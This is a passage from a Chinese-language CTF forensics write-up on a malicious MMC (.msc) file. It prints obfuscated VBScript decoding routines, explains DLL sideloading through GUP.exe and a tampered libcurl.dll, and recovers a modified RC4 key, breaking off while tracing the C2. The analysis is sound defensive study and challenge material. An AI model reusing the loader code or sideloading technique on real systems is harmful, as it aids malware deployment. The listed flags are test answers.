plain">MiCzi9=Replace(MiCzi9,vbLf,vbNullString)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZyvKLLyyHHD=Len(MiCzi9) Mod 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If InStrRev(MiCzi9,"==") Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b7Z9n8=2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ElseIf InStrRev(MiCzi9,""+"=") Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b7Z9n8=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For ZyvKLLyyHHD=0 To 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Select Case ZyvKLLyyHHD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case 65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD-65</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case 97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD-71</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case 48,49,50,51,52,53,54,55,56,57</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD+4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case 43</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arrayByte3(ZyvKLLyyHHD)=62</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case 47</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arrayByte3(ZyvKLLyyHHD)=63</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case Else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Select</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For ZyvKLLyyHHD=0 To 63</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Rp7jaY2jOqr(ZyvKLLyyHHD)=ZyvKLLyyHHD*64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arrayLong5(ZyvKLLyyHHD)=ZyvKLLyyHHD*4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mbt0mzk6(ZyvKLLyyHHD)=ZyvKLLyyHHD*262144</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Liefs=StrConv(MiCzi9,vbFromUnicode)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ReDim CYhV8N((((UBound(Liefs)+1)\4)*3)-1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For iter=0 To UBound(Liefs) Step 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NALQp0Gu3=Mbt0mzk6(arrayByte3(Liefs(iter)))+arrayLong5(arrayByte3(Liefs(iter+1)))+Rp7jaY2jOqr(arrayByte3(Liefs(iter+2)))+arrayByte3(Liefs(iter+3))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZyvKLLyyHHD=NALQp0Gu3 And 16711680</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CYhV8N(VKkZEf)=ZyvKLLyyHHD\65536</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZyvKLLyyHHD=NALQp0Gu3 And 65280</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CYhV8N(VKkZEf+1)=ZyvKLLyyHHD\256</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CYhV8N(VKkZEf+2)=NALQp0Gu3 And 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VKkZEf=VKkZEf+3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">YBx4PZLTHSQ1=StrConv(CYhV8N,vbUnicode)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If b7Z9n8 Then YBx4PZLTHSQ1=Left(YBx4PZLTHSQ1,Len(YBx4PZLTHSQ1)-b7Z9n8)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">t4zFxxgg22=FTKaWvcYaGWt(StrConv(YBx4PZLTHSQ1,vbFromUnicode))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">t4zFxxgg22=qY7AOEpU1wn(t4zFxxgg22,"~")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Function qY7AOEpU1wn(str,chars)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim fqX3dbudmU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dim XVZECKbx()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">XVZECKbx=Split(str,chars)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fqX3dbudmU=UBound(XVZECKbx,1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If fqX3dbudmU&lt;&gt;0 Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">str=Left(str,Len(str)-fqX3dbudmU)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qY7AOEpU1wn=str</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></details>
<p>根据代码，可以确定文件的存放位置</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU'] -&gt; 69b23cfd967d07c39d1517e2a3c37e34</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE'] -&gt; d2fabdcc28074462ac2379101836c938</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. 69b23cfd967d07c39d1517e2a3c37e34</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. d2fabdcc28074462ac2379101836c938</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task7">task7<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task7" class="hash-link" aria-label="task7的直接链接" title="task7的直接链接">​</a></h3>
<blockquote>
<ol>
<li>攻击者使用的这个白 EXE 加载黑 DLL 的手法所对应的 MITRE ATT&amp;CK ID 是什么? (注意: 请注意示例的提示提交大类即可不需要细化到分项) 示例: T1000</li>
</ol>
</blockquote>
<p>根据题目，已经确定使用的手法为 白加黑 方案，即使用白名单程序（例如证书验证）加载恶意 DLL 库文件，借此规避安全软件的检测</p>
<p>根据攻击手法，可以确定到 <code>MITRE ATT&amp;CK ID T1574</code></p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>T1574 Hijack Execution Flow - 劫持执行流</div><div class="admonitionContent_BuS1"><p>对手可能通过劫持操作系统运行程序的方式来执行自己的恶意负载。劫持执行流的目的可能是为了持久性，因为这种劫持的执行可能会随着时间的推移再次发生。对手也可能利用这些机制来提升权限或规避防御措施，例如应用程序控制或其他执行限制。</p><p>对手劫持执行流的方式有很多种，包括通过操控操作系统定位要执行的程序。操作系统定位程序所需库文件的方式也可能被拦截。操作系统查找程序 / 资源的路径，例如文件目录，或在 Windows 中的注册表，也可能被污染，从而包括恶意负载。</p></div></div>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. T1574</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task8">task8<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task8" class="hash-link" aria-label="task8的直接链接" title="task8的直接链接">​</a></h3>
<blockquote>
<ol>
<li>攻击者所使用的黑 DLL 劫持了原始 DLL 的哪个函数? 示例: main</li>
</ol>
</blockquote>
<p>首先，需要将白 EXE 文件和黑 DLL 文件提取出来</p>
<p>使用文本编辑器打开 msc 文件，定位到</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241153-165336-a777ef16096a8589d868d318fd16c9ed.png" width="1555" height="1170" class="img_ev3q"></p>
<p>将两个 Base64 提取出来解码，得到的就是 <code>GUP.exe</code> 和 <code>libcurl.dll</code></p>
<p>对 <code>libcurl.dll</code> 进行逆向分析</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241102-170207-745e2d33cca98e0af7c85040efa1b8f6.png" width="1896" height="1311" class="img_ev3q"></p>
<p>对库函数进行检查，大部分函数都是 <code>dword</code> 返回，但是 <code>curl_easy_init()</code> 函数在 <code>dword</code> 返回之前调用了 <code>sub_10001240()</code> 函数</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">curl_easy_init</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sub_10001240</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">unk_100080B0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dwSize</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dword_10029B80</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>就 <code>curl_easy_init()</code> 函数多了一步函数调用，可以怀疑是 <code>curl_easy_init()</code> 函数被篡改</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. curl_easy_init</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task9">task9<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task9" class="hash-link" aria-label="task9的直接链接" title="task9的直接链接">​</a></h3>
<blockquote>
<ol>
<li>
<p>攻击者所使用的黑 DLL 解密下一阶段载荷所使用的算法是什么? 示例: chacha20</p>
</li>
<li>
<p>攻击者所使用的黑 DLL 解密下一阶段载荷所使用的 Key 是什么? (注意: 请提交一段小写的十六进制字符串) 示例: 1122334455</p>
</li>
</ol>
</blockquote>
<p>跟进分析 <code>sub_10001240()</code> 函数，直接将反编译结果丢给 <code>ChatGPT 4o</code> 可以得到以下回复</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>赞美 GPT</div><div class="admonitionContent_BuS1"><p>该反编译结果涉及的代码实现了一个加密算法，通常是基于一种类似 RC4 的伪随机数生成器（PRNG）模式，结合了状态混合、字节异或（XOR）操作和字节交换的操作。以下是对该加密算法的分析：</p><ol>
<li>
<p>初始化阶段</p>
<ul>
<li>
<p>字符串初始化：</p>
<ul>
<li><code>v41</code> 和 <code>v42</code> 的值（<code>-1952638222</code> 和 <code>23838</code>）通过计算 <code>strlen</code> 和 <code>8 * v1</code> 来初始化状态。</li>
<li>如果字符串的长度乘以 8 小于 32，则初始化一个 32 字节大小的缓冲区。</li>
</ul>
</li>
<li>
<p>内存分配：</p>
<ul>
<li>使用 <code>malloc</code> 为加密 / 解密过程分配内存，根据字符串的长度来决定分配大小。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>伪随机数生成器（PRNG）**</p>
<ul>
<li>使用一系列位运算和 <code>SSE</code> 指令（如 <code>_mm_and_ps</code>、<code>_mm_add_epi32</code>、<code>_mm_shuffle_epi32</code> 等）生成伪随机数。此过程涉及以下几个步骤：<!-- -->
<ul>
<li>将每个输入的字节经过一系列的位移、添加常量和按位与操作，从而生成伪随机的字节流。</li>
<li>每次生成的新随机数都经过了混合、打包（<code>_mm_packus_epi16</code>）和转换（<code>_mm_cvtsi128_si32</code>）操作。</li>
<li>生成的随机数被用于更新密钥流缓冲区 <code>v34</code> 中的数据。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>加密过程</p>
<ul>
<li>加密循环：<!-- -->
<ul>
<li>采用类似 RC4 的加密方式，通过对每个字节执行异或（XOR）操作来加密数据：<!-- -->
<ul>
<li>每次计算新的位置索引并通过 <code>v34</code> 数组中的值来更新和修改加密的状态。</li>
<li><code>this[v25] ^= v34[(v27 + (unsigned __int8)v34[v38]) % v35];</code> 这一行表示对输入数据（<code>this</code>）进行加密处理。</li>
</ul>
</li>
<li>在某些情况下，会执行字节交换（<code>v34[(v25 + v38) % v35] ^= v40;</code>）以进一步打乱加密状态。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>密钥调度与动态调整</p>
<ul>
<li>使用 <code>v41</code>、<code>v42</code> 和伪随机数生成器的输出作为动态的密钥调度算法（KSA），这个算法会根据输入的大小和字节值来修改密钥流。</li>
<li>随机字节生成和密钥流的混合帮助加强了加密算法的复杂性，使得输出加密结果更加难以预测。</li>
</ul>
</li>
<li>
<p>加密结果的保存与输出</p>
<ul>
<li>加密后的数据会存入 <code>lpProc</code> 中，并最终通过 <code>memcpy</code> 复制到外部。</li>
<li>在加密过程中，使用了一些图形界面相关的 API（如 <code>GetDC(0)</code> 和 <code>EnumFontsW</code>），这可能与数据加密的用途无关，或是代码在处理加密后的数据时对其进行了图形化的展示或输出。</li>
</ul>
</li>
<li>
<p>总结</p>
<ul>
<li>该算法整体上模仿了经典的流密码算法，如 RC4，但它结合了复杂的状态混合和字节交换机制。通过多个阶段的位操作和伪随机数生成，能够加密输入数据。</li>
<li>该加密算法的安全性依赖于密钥调度算法和伪随机数生成的复杂度，但其依旧容易受到一些常见的密码分析攻击（如频率分析）的影响。</li>
</ul>
</li>
<li>
<p>可能的改进：</p>
<ul>
<li>引入更强的混合算法，如更复杂的加密模式（例如 AES）来增强算法的抗攻击性。</li>
<li>加密过程中加入更多的动态变化和不同的加密子算法，避免潜在的模式暴露。</li>
</ul>
</li>
</ol></div></div>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>需要注意的是，按照 RC4 标准实现的源代码进行对应，会发现并非标准的 RC4 实现，不可以直接抄板子进行解密</p></div></div>
<p>对于 RC4 算法的 key，可以注意</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241111-171108-1475588468f942c49cdbea09bc7197f5.png" width="1108" height="526" class="img_ev3q"></p>
<p>将 <code>v41</code>,<code>v42</code> 作为 <code>Char</code> 变量进行查看，得到 <code>\x5D\x1E\x8B\x9D\x1A\xF2</code></p>
<p>由于 <code>key</code> 是使用小端序进行储存，对其进行转换即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. RC4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. f21a9d8b1e5d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task10">task10<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task10" class="hash-link" aria-label="task10的直接链接" title="task10的直接链接">​</a></h3>
<blockquote>
<ol>
<li>攻击者所使用的下一阶段载荷的回连 C2 是什么? (注意: 需要提供 ip 地址: 端口的形式) 示例: 127.0.0.1:5100</li>
</ol>
</blockquote>
<p>首先，先将 <code>libcurl.dll</code> 中的载荷进行提取</p>
<p>分析 <code>sub_10001240()</code> 函数的调用</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sub_10001240</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">unk_100080B0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dwSize</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>根据函数定义</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> __thiscall </span><span class="token function" style="color:#d73a49">sub_10001240</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_BYTE </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">this</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>以及对于函数逻辑的基本分析，可以确定数据储存在 <code>&amp;unk_100080B0</code> 中，那么可以直接在 <code>sub_10001240()</code> 函数的 <code>memcpy(lpProc, this, v23);</code> 语句下断点</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241121-172124-484b824819154943d9a5ec157a9641b3.png" width="1693" height="1285" class="img_ev3q"></p>
<p>然后配置动态调试的参数</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241121-172154-dd239734c2492d58a6e6d57c889a55d5.png" width="1962" height="1279" class="img_ev3q"></p>
<p>启动调试</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241122-172221-f1e786de0c289dc72218779eacde82eb.png" width="1963" height="1396" class="img_ev3q"></p>
<p>查看 <code>byte_67D880B0</code> 的内存</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241122-172252-f8bf2d5952aae49c103293d790d8b0ac.png" width="1828" height="1233" class="img_ev3q"></p>
<p>对其 dump 出来，可以发现是可执行数据</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241123-172324-e4c09ed3882e4314ee2e9a02a2254b92.png" width="2559" height="1371" class="img_ev3q"></p>
<p>下载下来，反编译，得到</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241125-172506-608e1d3dbc29760bc7f2f7a2f191a849.png" width="1524" height="1157" class="img_ev3q"></p>
<p>经过分析，可以确定 <code>sub_4013E0()</code> 函数是下载函数，那么在 <code>v8 = (void (*)(void))sub_4013E0(v7);</code> 语句下断点进行调试</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241127-172720-d6e85e3cc1e0ac3996f47a1065a694d2.png" width="1307" height="940" class="img_ev3q"></p>
<p>提取出来具体的参数</p>
